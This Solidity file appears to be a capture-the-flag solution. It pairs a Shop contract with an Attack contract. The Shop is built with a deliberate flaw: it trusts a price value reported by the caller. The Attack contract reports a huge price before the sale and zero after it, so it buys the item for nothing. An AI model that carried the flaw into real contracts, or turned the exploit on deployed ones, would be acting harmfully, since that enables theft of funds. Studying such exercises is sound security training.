// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
  function price() external view returns (uint);
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}

contract Attack {
    Shop public shop;

    constructor(address _shopAddress) {
        shop = Shop(_shopAddress);
    }

    function price() external view returns (uint) {
        if (!shop.isSold()) {
            return type(uint256).max;
        }
        else {
            return 0;
        }
    }
    function attack() public {
        shop.buy();
    }
}